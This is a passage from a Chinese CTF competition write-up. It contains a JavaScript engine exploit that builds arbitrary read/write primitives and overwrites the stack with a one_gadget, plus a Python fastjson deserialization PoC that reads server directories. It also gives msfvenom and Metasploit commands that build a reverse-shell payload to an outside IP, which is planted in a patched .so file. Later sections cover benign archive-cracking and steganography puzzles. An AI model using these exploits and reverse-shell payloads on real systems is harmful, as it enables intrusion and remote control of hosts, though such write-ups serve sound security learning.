    }
    function arb_write(addr,val){
        dv.setUint32(idx + 4, l32(addr[0]));
        dv.setUint32(idx + 8, l32(addr[1]));
        dv2.setUint32(0, l32(val[0]));
        dv2.setUint32(4, l32(val[1]));
    }
    var u = new Uint32Array(2);
    u[0] = dv.getUint32(idx + 4, 1);
    u[1] = dv.getUint32(idx + 8, 1);
    print(hex(pack64(u)));
    var elf_base = new Uint32Array(2);
    elf_base[0] = u[0] - 0x6f5e0;
    elf_base[1] = u[1];
    printhex("elf_base:",elf_base);
    var free_got = new Uint32Array(2);
    free_got[0] = elf_base[0] + 0x6bdd0;
    free_got[1] = elf_base[1];
    printhex("free_got:",free_got);
    var libc_base = arb_read(free_got);
    libc_base[0] -= 0x9d850;
    printhex("libc_base:",libc_base);
    var environ_addr = new Uint32Array(2);
    environ_addr[0] = libc_base[0] + 0x1ef2d0;
    environ_addr[1] = libc_base[1];
    printhex("environ_addr:",environ_addr);
    var stack_addr = arb_read(environ_addr);
    printhex("stack_addr:",stack_addr);
    var one_gadget = new Uint32Array(2);
    one_gadget[0] = (libc_base[0] + 0xe6c7e);
    one_gadget[1] = libc_base[1];
    printhex("one_gadget:",one_gadget);
    stack_addr[0] -= 0x118;
    arb_write(stack_addr,one_gadget);
    var zero = new Uint32Array(2);
    zero[0] = 0;
    zero[1] = 0;
    printhex("zero:",zero);
    stack_addr[0] -= 0x29;
    arb_write(stack_addr,zero);
    print("finish");
    for(let i = 0; i  ",i)
    r.sendlineafter("code> ","EOF")
    r.interactive()
### 还是你熟悉的fastjson吗
由代码可看到，依赖中使用了fastjson和org.fusesource.leveldbjni，通过这fastjosn进行反序列化，并结合leveldbjni进行rce。
找到参考文档：  以及skay小姐姐对上面议题的代码分析：  读取文件目录，获取so文件名。
需要先访问一次/test接口生成数据库和so文件，再读取文件名。
    import requests
    import os
    import sys
    import re
    import string
    #step1
    #read /tmp/ directory to find so file
    host = "http://11.1.1.18:8080"
    def step1():
        global host
        result = []
        def getArrayData(ch):
            out = []
            for c in result:
                out.append(str(ord(c)))
            out.append(str(ord(ch)))
            return ','.join(out)
        def poc(ch):
            url = '/hello'
            jsonstr = '{"abc":{"@type":"java.lang.AutoCloseable","@type":"org.apache.commons.io.input.BOMInputStream","delegate":{"@type":"org.apache.commons.io.input.ReaderInputStream","reader":{"@type":"jdk.nashorn.api.scripting.URLReader","url":"netdoc:///tmp/"},"charsetName":"utf-8","bufferSize":1024},"boms":[{"charsetName":"utf-8","bytes":[%s]}]},"address":{"$ref":"$.abc.BOM"}}'
            data = {
                'data': jsonstr % getArrayData(ch)
            }
            proxy = {'http':'127.0.0.1:8080'}
            proxy = {}
            rsp = requests.post(host+url, data=data, proxies=proxy)
            if "bytes" in rsp.text:
                return True
            else:
                return False
        while True:
            for ch in string.printable+'\r\n':
                if poc(ch):
                    result.append(ch)
                    print('step1>', ''.join(result))
                    break
step1()
二进制文件修改分析 通过议题ppt给出的shellcode注入位置，是在文件偏移0x197b0处。
反汇编代码如下
然而这里的空间比较小，只能jump到另外的位置去，将shellcode放到空的代码区局，找起来不方便。
这里参考skay小姐姐的方法，放到如下图的函数中，将shellcode设置为反弹msf的shellcode。
    生成shellcode
    msfvenom -a x64 --platform Linux -p linux/x64/meterpreter/reverse_tcp LHOST=39.103.160.59 LPORT=4444 > shellcode
    监听
    use exploit/multi/handler
    set PAYLOAD linux/x64/meterpreter/reverse_tcp
    exploit -j
写文件 问题： 测试时写文件，发现文件存在，则上传的文件为.bak结尾。
但是代码中给了一段copy覆盖的代码，用来解决这个问题。 参考skay小姐姐的base64编码的方法：
接下来就是将修改后的so文件上传并替换了，文件名为通过第一步获取到的文件名。 上传后，再次访问/test接口，触发rce。
OK，读取之到此结束。
## Misc
### login
打开页面需要登录，无账号密码，唯一可疑的只有底下的获取实例，点击发现可以获取一个提示文档，并说按照文档向 **PI:EMAIL**
发送邮件即可获取账号。
提示文档是个zip压缩包，里面还有一个加密的压缩包，看到三个文件都被加密了，第一反应解zip伪加密。
winhex修改所有0900伪0000后，发现文件的加密符都没了但是只有示例 - 副本可以正常打开。
由于副本和原文件的原始大小一样，所以盲猜是明文攻击，这里使用winrar压缩后，校对CRC一致，满足明文攻击要求，使用ARCHPR 4.54即可
1min左右就可以跑出密码为`qwe@123`，解压出password.zip，打开看见还是加密的，想要获得管理员账号密码，但仍有加密，且不是伪加密，又看到三个txt的原始大小只有6字节，这就是典型的CRC32碰撞，github上搜crc32直接碰
得到密码`welc0me_sangforctf`，解压得到`.password.swp`，linux下执行vim -r .password.swp
即可恢复出原文件。
回网站登录，看到恭喜我得到了flag，猜测藏在了页面源码里了。
但是所有查看源码的快捷键都被禁止了，都会弹框`What are U f**king
doing!`，这里解法也不唯一，可以利用浏览器插件，也可以利用`burpsuite`，这我仅用bp举例。
### Bridge
（本题有两个故事线，实际步骤可能与此wp有所不同） 第一步：使用binwalk分析出有zlib数据，但是无法使用binwalk
-e或foremost分离出有效文件，在010editor中查看图片。
第二步：010 editor中看到最后一个IDAT数据块长度异常，导出这段zlib数据。
第三步：观察IDAT标识后面的87 9C两个字节，恢复成zlib数据头标识`78
9C`，写脚本将此段zlib数据解压缩，可得到一个rar压缩包。注意解压缩的zlib数据应该是去掉IDAT-length、IDAT-type、IDAT-crc的数据部分，即（78 9C ..... ）。
    import zlib
    data = open("zlib_hex_data.txt", 'r',
                encoding="utf-8").read().replace(" ", "").replace("\n",
                                                                  "").strip()
    data_dec = zlib.decompress(bytes.fromhex(data))
    print(data_dec[:100])
    with open("zlib_data.rar", 'wb') as wf:
        wf.write(data_dec)
    #b'Rar!\x1a\x07\x01\x00J\x97,}\x0c\x01\x05\x08\x00\x07\x01\x01\x96\x9c\x87\x80\x00\xf7\xea}W\x13\x03\x02\xbd\x00\x04\xbd\x00\x00\x90:\xd1\xdc\x80\x00\x00\x03CMT\xe5\xa6\x82\xe6\x9e\x9c\xe4\xbd\xa0\xe4\xb8\x8d\xe7\x9f\xa5\xe9\x81\x93\xe8\xbf\x99\xe6\x98\xaf\xe4\xbb\x80\xe4\xb9\x88\xe4\xb8\x9c\xe8\xa5\xbf\xef\xbc\x8c\xe5\x8f\xaf\xe4\xbb\xa5\xe5\x8e\xbb\xe7\x9c\x8b
解压压缩包可得flag2，注意压缩包中有提示请先获取flag1。
第四步：继续找flag1，分析最开始的那张图片，实际使用zsteg和exiftool可以发现其他可以信息。
exiftool看到Copyright有可以十六进制：翻译过来是：dynamical-geometry。
zsteg发现这张图片除了存在extradata外，在中也有脏数据。
使用StegSolve检查隐写。
第五步：导出十六进制，这里不能直接打开图片，可使用foremost将PNG快速分离出来,最后得到一张590x590，大小为979KB的图片，注意如果仅去掉PNG字符前数据并改后缀为PNG也能正常查看图片，但会阻塞下一步分析像素操作。
第六步：到这里只有一张色彩值杂乱的PNG图片，分析其像素。
    from PIL import Image
    image = Image.open(r'C:\Users\during\Downloads\00000000.png')
    allpixels = []
    for x in range(image.width):
        for y in range(image.height):
            allpixels.append(image.getpixel((x, y)))
    print(len(allpixels)) # 348100
    print(allpixels[:4])
    # [(40, 176, 80), (37, 181, 75), (1, 253, 3), (2, 252, 4)]
    #           0x50           0x4B          0x03         0x04
第七步：取前四个字节即可看出，像素第三列隐藏着压缩包十六进制，批量提取并保存成zip压缩包，使用第四步得到的密码：dynamical-geometry解密，得到flag1文件。
    from PIL import Image
    image = Image.open(r'C:\Users\during\Downloads\00000000.png')
    allpixels = []
    for x in range(image.width):
        for y in range(image.height):
            if image.getpixel((x, y)) == (0, 0, 0):
                continue
            allpixels.append(image.getpixel((x, y))[2])
    hex_datalist = [str(hex(i))[2:].zfill(2) for i in allpixels]
    print("".join(hex_datalist)[:100])
    # 504b0304140009006300caa05753d904fdb22a4b0500dce856000f000b00666c6167312d61736369692e73746c0199070001
    with open("outpur.txt", 'w') as wf:
        wf.write("".join(hex_datalist))
第八步：记事本打开文件后，是3D打印模型中的STL格式文件，STL格式分为ascii、binary格式，使用在线工具或开源工具查看模型即可。这一步并不需要脑洞，拷贝stl-ascii格式数据百度即可查询到STL文件格式的有关内容。
根据flag1的STL格式，将flag2也尝试用STL预览器查看：
### Disk
看文件名`zse456tfdyhnjimko0-=[;.,.vera`可以发现是用Veracrpyt加密后的文件，观察文件名发现是初级磁盘密码，根据字母按键盘能得到密码：pvd。
使用任意一个没有被使用的卷标识挂载文件，能够得到如下两个文件。
看文件头`37 7A BC
AF`可只是7z压缩包，直接解压即可（是为了尽量减少附件体积，因为bitlocker加密对分区有大小限制所以初始分区较大），得到附件gooood。